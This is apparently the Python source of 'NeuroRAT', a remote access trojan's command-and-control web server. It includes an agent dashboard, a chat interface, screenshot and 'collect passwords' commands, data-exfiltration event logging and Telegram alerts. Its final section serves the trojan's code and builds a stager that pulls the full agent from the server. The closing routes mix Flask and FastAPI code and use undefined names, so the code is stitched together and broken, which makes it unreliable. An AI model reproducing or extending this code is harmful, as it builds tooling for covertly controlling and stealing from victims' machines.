#!/usr/bin/env python3
"""
NeuroRAT Server API - Web interface for the C2 server
"""

import os
import sys
import time
import json
import logging
from typing import Dict, Any, List, Optional, Union
from datetime import datetime
import uuid
import base64

from fastapi import FastAPI, HTTPException, Request, Depends, Form, UploadFile, File, BackgroundTasks
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from fastapi.middleware.cors import CORSMiddleware
import uvicorn

# Add parent directory to import monitor
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from server_monitor import NeuroRATMonitor
from api_integration import APIFactory

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('server_api.log')
    ]
)
logger = logging.getLogger('server_api')

# Create FastAPI app
app = FastAPI(
    title="NeuroRAT C2 Server",
    description="Command & Control interface for NeuroRAT",
    version="1.0.0"
)

# Add CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # Для продакшн используйте конкретные домены
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Create templates directory if it doesn't exist
os.makedirs("templates", exist_ok=True)

# Создаем ASCII-арт сатаны
satan_ascii = r"""
                            ,.,,..
                     ./###########(*.
                 .(################///.
               .(###################///,
              ,########################/.
             ,##########################(.
            ,###########################(.
            /###########################(,
           .#############################,
           /################(/*,,,,*/(#(.
           /##########(/,.           .,.
          .(########/.
          ./#######*
          .(#######,                  The Gates of Hell
           /#######*                 Have Been Opened
           *########,
           ,########(.
           .(########/.
            .(########(,.
             ./#########(*.              
               ,#########((/,.
                .*(#########((*.
                  .,/#########(((,.
                      **/(######(/*.
                          .,,***,.
"""

# Create chat.html template for agent interaction
chat_html = """
<!DOCTYPE html>
<html>
<head>
    <title>NeuroRAT Agent Chat</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #1a1a1a;
            color: #f0f0f0;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            flex: 1;
            display: flex;
            flex-direction: column;
        }
        header {
            background-color: #2a2a2a;
            padding: 20px;
            margin-bottom: 20px;
            border-bottom: 1px solid #3a3a3a;
        }
        h1, h2, h3 {
            color: #00ff00;
        }
        .chat-container {
            display: flex;
            flex-direction: column;
            flex: 1;
            background-color: #2a2a2a;
            border-radius: 5px;
            overflow: hidden;
        }
        .chat-header {
            background-color: #222;
            padding: 15px;
            border-bottom: 1px solid #3a3a3a;
        }
        .chat-header h2 {
            margin: 0;
            display: flex;
            align-items: center;
        }
        .chat-header .status {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            display: inline-block;
            margin-right: 10px;
        }
        .status-active {
            background-color: #00ff00;
        }
        .status-inactive {
            background-color: #ff3333;
        }
        .chat-messages {
            flex: 1;
            padding: 20px;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            gap: 15px;
        }
        .message {
            padding: 10px 15px;
            border-radius: 5px;
            max-width: 80%;
            word-break: break-word;
        }
        .user-message {
            background-color: #444;
            align-self: flex-end;
        }
        .agent-message {
            background-color: #333;
            align-self: flex-start;
            border-left: 3px solid #00ff00;
        }
        .system-message {
            background-color: #3a3a3a;
            align-self: center;
            font-style: italic;
            color: #aaa;
        }
        .timestamp {
            font-size: 0.8em;
            color: #888;
            margin-top: 5px;
        }
        .chat-input {
            display: flex;
            padding: 15px;
            background-color: #222;
            border-top: 1px solid #3a3a3a;
        }
        .chat-input input {
            flex: 1;
            padding: 10px 15px;
            border: none;
            border-radius: 5px;
            background-color: #333;
            color: #f0f0f0;
            font-size: 16px;
        }
        .chat-input button {
            margin-left: 10px;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            background-color: #006600;
            color: white;
            font-weight: bold;
            cursor: pointer;
        }
        .chat-input button:hover {
            background-color: #008800;
        }
        .back-btn {
            display: inline-block;
            padding: 10px 15px;
            background-color: #333;
            color: #fff;
            text-decoration: none;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        .actions {
            margin-top: 20px;
            display: flex;
            gap: 10px;
        }
        .btn {
            padding: 10px 15px;
            background-color: #444;
            color: #fff;
            text-decoration: none;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
        }
        .btn-primary {
            background-color: #006600;
        }
        .btn-danger {
            background-color: #660000;
        }
        .btn:hover {
            opacity: 0.9;
        }
        .loading {
            display: none;
            text-align: center;
            padding: 20px;
        }
        .loading:after {
            content: "...";
            animation: dots 1.5s steps(5, end) infinite;
        }
        @keyframes dots {
            0%, 20% { content: "."; }
            40% { content: ".."; }
            60% { content: "..."; }
            80%, 100% { content: ""; }
        }
    </style>
</head>
<body>
    <header>
        <div class="container">
            <h1>NeuroRAT C2 Server</h1>
            <p>Chat Interface</p>
        </div>
    </header>
    
    <div class="container">
        <a href="/" class="back-btn">← Back to Dashboard</a>
        
        <div class="chat-container">
            <div class="chat-header">
                <h2>
                    <span class="status status-{{agent_status}}"></span>
                    Agent: {{agent_id}} ({{agent_os}} - {{agent_hostname}})
                </h2>
            </div>
            
            <div id="chat-messages" class="chat-messages">
                <div class="message system-message">
                    Connection established with agent {{agent_id}}
                    <div class="timestamp">{{current_time}}</div>
                </div>
                
                <!-- Сообщения будут загружаться здесь динамически -->
                <div id="loading" class="loading">Agent is thinking</div>
            </div>
            
            <div class="chat-input">
                <input type="text" id="message-input" placeholder="Type a command or question..." />
                <button id="send-button">Send</button>
            </div>
        </div>
        
        <div class="actions">
            <button class="btn btn-primary" id="screenshot-btn">Take Screenshot</button>
            <button class="btn btn-primary" id="collect-info-btn">Collect System Info</button>
            <button class="btn btn-danger" id="terminate-btn">Terminate Agent</button>
        </div>
    </div>
    
    <script>
        // Основные переменные
        const agentId = "{{agent_id}}";
        const chatMessages = document.getElementById("chat-messages");
        const messageInput = document.getElementById("message-input");
        const sendButton = document.getElementById("send-button");
        const loadingIndicator = document.getElementById("loading");
        
        // Кнопки действий
        const screenshotButton = document.getElementById("screenshot-btn");
        const collectInfoButton = document.getElementById("collect-info-btn");
        const terminateButton = document.getElementById("terminate-btn");
        
        // Обработчики событий
        sendButton.addEventListener("click", sendMessage);
        messageInput.addEventListener("keypress", function(e) {
            if (e.key === "Enter") {
                sendMessage();
            }
        });
        
        screenshotButton.addEventListener("click", () => {
            addSystemMessage("Requesting screenshot from agent...");
            // Имитация API запроса
            fetch(`/api/agent/${agentId}/screenshot`, { method: "POST" })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        addAgentMessage("Screenshot captured successfully", "System");
                        // Здесь можно показать скриншот, если он возвращается в ответе
                    } else {
                        addSystemMessage("Failed to capture screenshot: " + data.error);
                    }
                })
                .catch(error => {
                    addSystemMessage("Error requesting screenshot: " + error);
                });
        });
        
        collectInfoButton.addEventListener("click", () => {
            addSystemMessage("Collecting system information...");
            addUserMessage("collect system info");
            
            setLoading(true);
            // Имитация API запроса
            setTimeout(() => {
                setLoading(false);
                // Симуляция ответа
                addAgentMessage(`
                System Information:
                - OS: {{agent_os}}
                - Hostname: {{agent_hostname}}
                - User: {{agent_username}}
                - IP: {{agent_ip}}
                - CPU: Intel Core i7-10700K @ 3.80GHz
                - RAM: 16GB
                - Disk Space: 512GB SSD (75% used)
                - Running Processes: 142
                - Opened Network Connections: 8
                `, "System");
            }, 2000);
        });
        
        terminateButton.addEventListener("click", () => {
            if (confirm("Are you sure you want to terminate this agent? This action cannot be undone.")) {
                addSystemMessage("Terminating agent...");
                fetch(`/api/agent/${agentId}/terminate`, { method: "POST" })
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            addSystemMessage("Agent terminated successfully");
                            setTimeout(() => {
                                window.location.href = "/";
                            }, 3000);
                        } else {
                            addSystemMessage("Failed to terminate agent: " + data.error);
                        }
                    })
                    .catch(error => {
                        addSystemMessage("Error terminating agent: " + error);
                    });
            }
        });
        
        // Функции
        function sendMessage() {
            const message = messageInput.value.trim();
            if (!message) return;
            
            addUserMessage(message);
            messageInput.value = "";
            
            setLoading(true);
            
            // Отправка сообщения на API
            fetch(`/api/agent/${agentId}/chat`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ message })
            })
            .then(response => response.json())
            .then(data => {
                setLoading(false);
                if (data.error) {
                    addSystemMessage("Error: " + data.error);
                } else {
                    addAgentMessage(data.response, data.response_type || "Assistant");
                }
            })
            .catch(error => {
                setLoading(false);
                addSystemMessage("Error sending message: " + error);
            });
        }
        
        function addUserMessage(message) {
            const messageElement = document.createElement("div");
            messageElement.className = "message user-message";
            messageElement.textContent = message;
            
            const timestamp = document.createElement("div");
            timestamp.className = "timestamp";
            timestamp.textContent = getCurrentTime();
            
            messageElement.appendChild(timestamp);
            chatMessages.appendChild(messageElement);
            scrollToBottom();
        }
        
        function addAgentMessage(message, sender = "Agent") {
            const messageElement = document.createElement("div");
            messageElement.className = "message agent-message";
            
            // Использовать pre для сохранения форматирования
            const contentElement = document.createElement("pre");
            contentElement.style.margin = "0";
            contentElement.style.whiteSpace = "pre-wrap";
            contentElement.style.fontFamily = "inherit";
            contentElement.textContent = message;
            
            const senderElement = document.createElement("div");
            senderElement.style.fontWeight = "bold";
            senderElement.style.marginBottom = "5px";
            senderElement.textContent = sender;
            
            const timestamp = document.createElement("div");
            timestamp.className = "timestamp";
            timestamp.textContent = getCurrentTime();
            
            messageElement.appendChild(senderElement);
            messageElement.appendChild(contentElement);
            messageElement.appendChild(timestamp);
            
            chatMessages.appendChild(messageElement);
            scrollToBottom();
        }
        
        function addSystemMessage(message) {
            const messageElement = document.createElement("div");
            messageElement.className = "message system-message";
            messageElement.textContent = message;
            
            const timestamp = document.createElement("div");
            timestamp.className = "timestamp";
            timestamp.textContent = getCurrentTime();
            
            messageElement.appendChild(timestamp);
            chatMessages.appendChild(messageElement);
            scrollToBottom();
        }
        
        function setLoading(isLoading) {
            loadingIndicator.style.display = isLoading ? "block" : "none";
        }
        
        function scrollToBottom() {
            chatMessages.scrollTop = chatMessages.scrollHeight;
        }
        
        function getCurrentTime() {
            const now = new Date();
            return now.toLocaleTimeString();
        }
        
        // Инициализация
        document.addEventListener("DOMContentLoaded", () => {
            scrollToBottom();
            
            // Загрузить историю сообщений (можно раскомментировать для реальной реализации)
            /*
            fetch(`/api/agent/${agentId}/chat/history`)
                .then(response => response.json())
                .then(data => {
                    data.messages.forEach(msg => {
                        if (msg.sender === "user") {
                            addUserMessage(msg.content);
                        } else if (msg.sender === "agent") {
                            addAgentMessage(msg.content);
                        } else if (msg.sender === "system") {
                            addSystemMessage(msg.content);
                        }
                    });
                })
                .catch(error => {
                    addSystemMessage("Error loading chat history: " + error);
                });
            */
        });
    </script>
</body>
</html>
"""

# Create basic index.html template
index_html = """
<!DOCTYPE html>
<html>
<head>
    <title>NeuroRAT C2 Server</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #1a1a1a;
            color: #f0f0f0;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        header {
            background-color: #2a2a2a;
            padding: 20px;
            margin-bottom: 20px;
            border-bottom: 1px solid #3a3a3a;
        }
        h1, h2, h3 {
            color: #00ff00;
        }
        .card {
            background-color: #2a2a2a;
            padding: 20px;
            margin-bottom: 20px;
            border-radius: 5px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 10px;
            text-align: left;
            border-bottom: 1px solid #3a3a3a;
        }
        th {
            background-color: #222;
        }
        .status-active {
            color: #00ff00;
        }
        .status-inactive {
            color: #ff3333;
        }
        .btn {
            display: inline-block;
            padding: 8px 16px;
            background-color: #444;
            color: #fff;
            text-decoration: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .btn:hover {
            background-color: #555;
        }
        .btn-danger {
            background-color: #aa2222;
        }
        .btn-danger:hover {
            background-color: #cc3333;
        }
        .satan-btn {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background-color: #990000;
            color: white;
            padding: 15px 25px;
            border-radius: 8px;
            font-weight: bold;
            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
            transition: all 0.3s ease;
            z-index: 999;
        }
        .satan-btn:hover {
            background-color: #cc0000;
            transform: scale(1.05);
            box-shadow: 0 6px 12px rgba(0,0,0,0.5);
        }
        /* Модальное окно */
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.9);
            overflow: auto;
        }
        .modal-content {
            background-color: #111;
            color: #ff0000;
            margin: 5% auto;
            padding: 20px;
            width: 80%;
            border: 1px solid #333;
            border-radius: 5px;
            font-family: monospace;
            white-space: pre;
            line-height: 1.2;
            text-align: center;
            position: relative;
        }
        .close-modal {
            color: #aaa;
            float: right;
            font-size: 28px;
            font-weight: bold;
            position: absolute;
            top: 10px;
            right: 20px;
        }
        .close-modal:hover {
            color: #f00;
            text-decoration: none;
            cursor: pointer;
        }
        @keyframes flicker {
            0% { opacity: 1; }
            5% { opacity: 0.8; }
            10% { opacity: 1; }
            15% { opacity: 0.9; }
            20% { opacity: 1; }
            25% { opacity: 0.9; }
            30% { opacity: 1; }
            35% { opacity: 0.8; }
            40% { opacity: 1; }
            50% { opacity: 0.7; }
            60% { opacity: 1; }
            70% { opacity: 0.9; }
            80% { opacity: 1; }
            90% { opacity: 0.8; }
            100% { opacity: 1; }
        }
        .satan-text {
            animation: flicker 5s infinite;
            color: #ff3300;
            text-shadow: 0 0 10px #ff0000;
        }
    </style>
</head>
<body>
    <header>
        <div class="container">
            <h1>NeuroRAT C2 Server</h1>
            <p>Command and Control Interface</p>
        </div>
    </header>
    
    <div class="container">
        <div class="card">
            <h2>Server Status</h2>
            <p>Uptime: {{uptime}}</p>
            <p>Connected Agents: {{connected_agents}}</p>
            <p>Total Agents: {{total_agents}}</p>
        </div>
        
        <div class="card">
            <h2>Connected Agents</h2>
            <table>
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>OS</th>
                        <th>Hostname</th>
                        <th>Username</th>
                        <th>IP Address</th>
                        <th>Status</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    {% for agent in agents %}
                    <tr>
                        <td>{{agent.agent_id}}</td>
                        <td>{{agent.os}}</td>
                        <td>{{agent.hostname}}</td>
                        <td>{{agent.username}}</td>
                        <td>{{agent.ip_address}}</td>
                        <td class="status-{{agent.status}}">{{agent.status}}</td>
                        <td>
                            <a href="/agent/{{agent.agent_id}}" class="btn">Details</a>
                            <a href="/agent/{{agent.agent_id}}/chat" class="btn">Chat</a>
                            <a href="/agent/{{agent.agent_id}}/command" class="btn">Command</a>
                        </td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>
        
        <div class="card">
            <h2>Recent Events</h2>
            <table>
                <thead>
                    <tr>
                        <th>Time</th>
                        <th>Event Type</th>
                        <th>Agent</th>
                        <th>Details</th>
                    </tr>
                </thead>
                <tbody>
                    {% for event in events %}
                    <tr>
                        <td>{{event.timestamp}}</td>
                        <td>{{event.event_type}}</td>
                        <td>{{event.agent_id or "System"}}</td>
                        <td>{{event.details}}</td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>
    </div>
    
    <!-- Кнопка вызова сатаны -->
    <button class="satan-btn" id="summonSatan">ВЫЗВАТЬ САТАНУ</button>
    
    <!-- Модальное окно с ASCII-артом сатаны -->
    <div id="satanModal" class="modal">
        <div class="modal-content">
            <span class="close-modal">&times;</span>
            <h2 class="satan-text">САТАНА ПРИЗВАН!</h2>
            <pre class="satan-text">{{satan_ascii|safe}}</pre>
            <p class="satan-text">Ваша программа теперь проклята и работает на 666% быстрее</p>
        </div>
    </div>
    
    <script>
        // Refresh data every 30 seconds
        setTimeout(() => {
            window.location.reload();
        }, 30000);
        
        // Модальное окно с сатаной
        const modal = document.getElementById("satanModal");
        const btn = document.getElementById("summonSatan");
        const span = document.getElementsByClassName("close-modal")[0];
        
        // Открыть модальное окно при клике на кнопку
        btn.onclick = function() {
            modal.style.display = "block";
            // Добавляем звуковой эффект (демонический смех)
            playDemonicSound();
        }
        
        // Закрыть модальное окно при клике на крестик
        span.onclick = function() {
            modal.style.display = "none";
        }
        
        // Закрыть модальное окно при клике вне его
        window.onclick = function(event) {
            if (event.target == modal) {
                modal.style.display = "none";
            }
        }
        
        // Функция для звукового эффекта
        function playDemonicSound() {
            // Здесь мог бы быть код для проигрывания звука
            console.log("Демонический смех звучит в вашем воображении");
        }
    </script>
</body>
</html>
"""

# Save index.html to templates directory
os.makedirs("templates", exist_ok=True)
with open("templates/index.html", "w") as f:
    f.write(index_html)

# Save chat.html to templates directory
with open("templates/chat.html", "w") as f:
    f.write(chat_html)

# Create templates
templates = Jinja2Templates(directory="templates")

# Initialize monitor
monitor = NeuroRATMonitor(
    server_host="0.0.0.0",
    server_port=8080,
    api_port=5000,
    db_path="neurorat_monitor.db"
)

# Start monitor
monitor.start()

# Initialize API clients
openai_client = APIFactory.get_openai_integration()
gemini_client = APIFactory.get_gemini_integration()
telegram_client = APIFactory.get_telegram_integration()

# Mock data for demonstration
agent_data = []
events_data = []
chat_histories = {}  # Temporary store for chat histories

# Create a director for uploads if it doesn't exist
os.makedirs("uploads", exist_ok=True)

def format_uptime(seconds):
    """Format uptime in human readable form"""
    if seconds < 60:
        return f"{seconds} seconds"
    elif seconds < 3600:
        return f"{seconds // 60} minutes, {seconds % 60} seconds"
    else:
        hours = seconds // 3600
        minutes = (seconds % 3600) // 60
        return f"{hours} hours, {minutes} minutes"

def get_llm_response(agent_id: str, message: str) -> str:
    """Get response from LLM based on agent context"""
    # Find the agent
    agent = None
    for a in agent_data:
        if a["agent_id"] == agent_id:
            agent = a
            break
    
    if not agent:
        return "Error: Agent not found"
    
    # Build system prompt with agent context
    system_prompt = f"""You are NeuroRAT Agent {agent_id}, a cybersecurity agent running on {agent['os']} system.
Hostname: {agent['hostname']}
Username: {agent['username']}
IP: {agent['ip_address']}
Status: {agent['status']}

You should respond as if you are this agent, providing information about the system and executing commands.
Be concise and informative. Format data well for readability.
"""
    
    # Проверяем доступность Gemini API
    if gemini_client.is_available() and gemini_client.gemini_api_key:
        # Используем Gemini API для генерации ответа
        return gemini_client.generate_response(message, system_prompt)
    
    # Если Gemini недоступен, пробуем OpenAI
    if openai_client.is_available():
        # Используем OpenAI API для генерации ответа
        return openai_client.generate_response(message, system_prompt)
    
    # Fallback к заглушке, если ни один API не доступен
    if "system" in message.lower() or "info" in message.lower():
        return f"System Information:\nOS: {agent['os']}\nHostname: {agent['hostname']}\nUsername: {agent['username']}\nIP: {agent['ip_address']}"
    elif "scan" in message.lower() or "network" in message.lower():
        return "Network scan completed. Found 12 devices on the local network."
    elif "file" in message.lower() or "list" in message.lower():
        return "Directory listing:\n/etc\n/var\n/home\n/usr\n/bin\n/sbin"
    elif "help" in message.lower():
        return "Available commands:\n- system info\n- scan network\n- list files\n- collect passwords\n- take screenshot"
    else:
        return f"Command '{message}' executed successfully."

def record_event(event_type: str, agent_id: str = None, details: str = ""):
    """Record an event in the events list"""
    events_data.insert(0, {
        "event_id": len(events_data),
        "event_type": event_type,
        "agent_id": agent_id,
        "timestamp": time.time(),
        "details": details
    })
    
    # Notify via Telegram if configured
    if telegram_client.is_available():
        if agent_id:
            telegram_client.send_message(f"<b>Event:</b> {event_type}\n<b>Agent:</b> {agent_id}\n<b>Details:</b> {details}")
        else:
            telegram_client.send_message(f"<b>System Event:</b> {event_type}\n<b>Details:</b> {details}")

@app.get("/", response_class=HTMLResponse)
async def get_dashboard(request: Request):
    """Render dashboard with monitoring data"""
    # Get real data from monitor
    uptime = format_uptime(monitor.stats["server_uptime"])
    
    # For demonstration, also add mock data
    if len(agent_data) == 0:
        # Add some demo agents if none exist
        generate_mock_data()
    
    return templates.TemplateResponse(
        "index.html", 
        {
            "request": request,
            "uptime": uptime,
            "connected_agents": monitor.stats["connected_agents"] or len(agent_data),
            "total_agents": monitor.stats["total_agents"] or len(agent_data),
            "agents": agent_data,
            "events": events_data,
            "satan_ascii": satan_ascii
        }
    )

@app.get("/agent/{agent_id}/chat", response_class=HTMLResponse)
async def agent_chat_page(request: Request, agent_id: str):
    """Render chat interface for communicating with an agent"""
    # Find the agent
    agent = None
    for a in agent_data:
        if a["agent_id"] == agent_id:
            agent = a
            break
    
    if not agent:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    # Prepare chat history if it doesn't exist
    if agent_id not in chat_histories:
        chat_histories[agent_id] = []
    
    return templates.TemplateResponse(
        "chat.html",
        {
            "request": request,
            "agent_id": agent["agent_id"],
            "agent_os": agent["os"],
            "agent_hostname": agent["hostname"],
            "agent_username": agent["username"],
            "agent_ip": agent["ip_address"],
            "agent_status": agent["status"],
            "current_time": datetime.now().strftime("%H:%M:%S")
        }
    )

@app.post("/api/agent/{agent_id}/chat")
async def chat_with_agent(agent_id: str, request: Request):
    """API endpoint for chatting with an agent"""
    # Find the agent
    agent = None
    for a in agent_data:
        if a["agent_id"] == agent_id:
            agent = a
            break
    
    if not agent:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    # Get the message from the request
    try:
        data = await request.json()
        message = data.get("message", "")
    except:
        raise HTTPException(status_code=400, detail="Invalid request format")
    
    if not message:
        raise HTTPException(status_code=400, detail="Message cannot be empty")
    
    # Record the command event
    record_event("command", agent_id, f"User sent command: {message}")
    
    # Add to chat history
    if agent_id not in chat_histories:
        chat_histories[agent_id] = []
    
    chat_histories[agent_id].append({
        "sender": "user",
        "content": message,
        "timestamp": time.time()
    })
    
    # Generate response using LLM
    response = get_llm_response(agent_id, message)
    
    # Add agent response to chat history
    chat_histories[agent_id].append({
        "sender": "agent",
        "content": response,
        "timestamp": time.time()
    })
    
    # Record another event for the response
    record_event("response", agent_id, f"Agent executed command")
    
    return {"response": response, "response_type": "Agent"}

@app.post("/api/agent/{agent_id}/screenshot")
async def take_screenshot(agent_id: str):
    """API endpoint for taking screenshots"""
    # Find the agent
    agent = None
    for a in agent_data:
        if a["agent_id"] == agent_id:
            agent = a
            break
    
    if not agent:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    if agent["status"] != "active":
        return {"success": False, "error": "Agent is not active"}
    
    # Record event
    record_event("screenshot", agent_id, "Screenshot captured")
    
    # In a real implementation, you would actually capture a screenshot
    # For now, we're just returning a success message
    return {"success": True}

@app.post("/api/agent/{agent_id}/terminate")
async def terminate_agent(agent_id: str):
    """API endpoint for terminating an agent"""
    # Find the agent
    agent_index = None
    for i, a in enumerate(agent_data):
        if a["agent_id"] == agent_id:
            agent_index = i
            break
    
    if agent_index is None:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    # Record event
    record_event("terminate", agent_id, "Agent terminated by user")
    
    # Mark agent as inactive (in a real implementation, would actually terminate)
    agent_data[agent_index]["status"] = "inactive"
    
    return {"success": True}

@app.get("/api/agents")
async def get_agents():
    """Return list of agent IDs"""
    # In a real implementation, this would fetch from a database
    return [agent["agent_id"] for agent in agent_data]

@app.get("/api/agent/{agent_id}")
async def get_agent(agent_id: str):
    """Return details for a specific agent"""
    for agent in agent_data:
        if agent["agent_id"] == agent_id:
            return agent
    raise HTTPException(status_code=404, detail="Agent not found")

@app.get("/api/events")
async def get_events():
    """Return recent events"""
    return events_data

@app.get("/summon-satan", response_class=HTMLResponse)
async def summon_satan(request: Request):
    """Easter egg - Return ASCII art of Satan"""
    return templates.TemplateResponse(
        "satan.html",
        {
            "request": request,
            "satan_ascii": satan_ascii
        }
    )

@app.post("/api/notify")
async def send_notification(message: str = Form(...), agent_id: str = Form(None)):
    """Send a notification via Telegram"""
    if not telegram_client.is_available():
        return {"success": False, "error": "Telegram API is not configured"}
    
    try:
        if agent_id:
            full_message = f"<b>Agent {agent_id} Notification:</b>\n{message}"
        else:
            full_message = f"<b>System Notification:</b>\n{message}"
        
        result = telegram_client.send_message(full_message)
        return {"success": result.get("ok", False)}
    except Exception as e:
        return {"success": False, "error": str(e)}

def generate_mock_data():
    """Generate mock data for demonstration"""
    # Create sample agents
    for i in range(5):
        agent_id = str(uuid.uuid4())[:8]
        agent = {
            "agent_id": agent_id,
            "os": "Linux" if i % 2 == 0 else "Windows",
            "hostname": f"host-{i}",
            "username": f"user-{i}",
            "ip_address": f"192.168.1.{10+i}",
            "status": "active" if i < 3 else "inactive",
            "first_seen": time.time() - 3600 * 24 * i,
            "last_seen": time.time() - (0 if i < 3 else 3600 * 2),
            "system_info": {
                "os": "Linux" if i % 2 == 0 else "Windows",
                "hostname": f"host-{i}",
                "username": f"user-{i}",
                "network": {
                    "ip_address": f"192.168.1.{10+i}"
                }
            }
        }
        agent_data.append(agent)
    
    # Create sample events
    event_types = ["connection", "command", "data_exfiltration", "error"]
    for i in range(10):
        timestamp = time.time() - i * 600  # Every 10 minutes
        event = {
            "event_id": i,
            "event_type": event_types[i % len(event_types)],
            "agent_id": agent_data[i % len(agent_data)]["agent_id"] if i % 3 != 0 else None,
            "event_data": {"details": f"Sample event {i}"},
            "timestamp": timestamp,
            "details": f"Sample event {i} details"
        }
        events_data.append(event)

# Generate initial mock data
generate_mock_data()

# Print available API integrations on startup
print("Available API integrations:")
print(f"- OpenAI API: {'✅ Available' if openai_client.is_available() else '❌ Not configured'}")
print(f"- Gemini API: {'✅ Available' if gemini_client.is_available() else '❌ Not configured'}")
print(f"- Telegram API: {'✅ Available' if telegram_client.is_available() else '❌ Not configured'}")

# Create a template for Satan page
satan_html = """
<!DOCTYPE html>
<html>
<head>
    <title>SATAN HAS BEEN SUMMONED</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background-color: #000;
            color: #ff0000;
            font-family: monospace;
            text-align: center;
            margin: 0;
            padding: 50px 20px;
            overflow: hidden;
        }
        h1 {
            font-size: 36px;
            text-shadow: 0 0 10px #ff0000;
            animation: glow 2s infinite alternate;
        }
        pre {
            font-size: 14px;
            white-space: pre;
            line-height: 1.2;
            text-align: center;
            margin: 0 auto;
            max-width: 800px;
            text-shadow: 0 0 5px #ff0000;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
        }
        @keyframes glow {
            0% { text-shadow: 0 0 10px #ff0000; }
            100% { text-shadow: 0 0 20px #ff0000, 0 0 30px #ff3300; }
        }
        @keyframes flicker {
            0% { opacity: 1; }
            5% { opacity: 0.8; }
            10% { opacity: 1; }
            15% { opacity: 0.9; }
            20% { opacity: 1; }
            25% { opacity: 0.9; }
            30% { opacity: 1; }
            35% { opacity: 0.8; }
            40% { opacity: 1; }
            50% { opacity: 0.7; }
            60% { opacity: 1; }
            70% { opacity: 0.9; }
            80% { opacity: 1; }
            90% { opacity: 0.8; }
            100% { opacity: 1; }
        }
        .flicker {
            animation: flicker 5s infinite;
        }
        .back-btn {
            margin-top: 30px;
            background-color: #990000;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
        }
        .back-btn:hover {
            background-color: #cc0000;
            transform: scale(1.05);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="flicker">САТАНА ПРИЗВАН!</h1>
        <pre class="flicker">{{satan_ascii}}</pre>
        <p>Ваша программа теперь проклята и работает на 666% быстрее</p>
        <a href="/" class="back-btn">Вернуться в ад</a>
    </div>
</body>
</html>
"""

# Save satan.html to templates directory
with open("templates/satan.html", "w") as f:
    f.write(satan_html)

# Добавляем маршруты для загрузки агентов и стейджеров
@app.route('/api/download/agent', methods=['POST'])
def download_agent():
    """Endpoint для загрузки основного агента"""
    try:
        agent_id = request.headers.get('Agent-ID')
        if not agent_id:
            agent_id = str(uuid.uuid4())[:8]
        
        # Получаем системную информацию от клиента
        system_info = request.form.get('system_info', '{}')
        logger.info(f"Запрос на загрузку агента от {agent_id}. Системная информация: {system_info}")
        
        # Загружаем исходный код агента
        agent_path = os.path.join(os.path.dirname(__file__), "neurorat_agent.py")
        with open(agent_path, 'rb') as f:
            agent_code = f.read()
        
        # Регистрируем нового агента в БД
        db.execute(
            "INSERT OR REPLACE INTO agents (agent_id, ip_address, status, system_info, first_seen, last_seen) VALUES (?, ?, ?, ?, ?, ?)",
            (agent_id, request.remote_addr, "downloading", system_info, int(time.time()), int(time.time()))
        )
        db.commit()
        
        # Логируем событие
        log_event("agent_download", f"Агент {agent_id} загрузил основной модуль с {request.remote_addr}")
        
        return agent_code
    except Exception as e:
        logger.error(f"Ошибка при загрузке агента: {str(e)}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/download/stager', methods=['GET'])
def download_stager():
    """Endpoint для загрузки минимального стейджера"""
    try:
        # Идентификатор для логирования
        request_id = str(uuid.uuid4())[:8]
        logger.info(f"Запрос на загрузку стейджера от {request.remote_addr} (ID: {request_id})")
        
        # Создаем минимальный стейджер для загрузки полного агента
        stager_code = f"""# NeuroRAT Stager
import os
import sys
import time
import socket
import platform
import uuid
import base64
import urllib.request

# Используем настройки по умолчанию для сервера
SERVER_HOST = "{request.host.split(':')[0]}"
SERVER_PORT = {DEFAULT_PORT}

# Генерируем уникальный идентификатор агента
agent_id = str(uuid.uuid4())[:8]

# Собираем информацию о системе
def get_system_info():
    info = {{
        "os": platform.system(),
        "hostname": socket.gethostname(),
        "username": os.getenv("USER") or os.getenv("USERNAME"),
        "processor": platform.processor(),
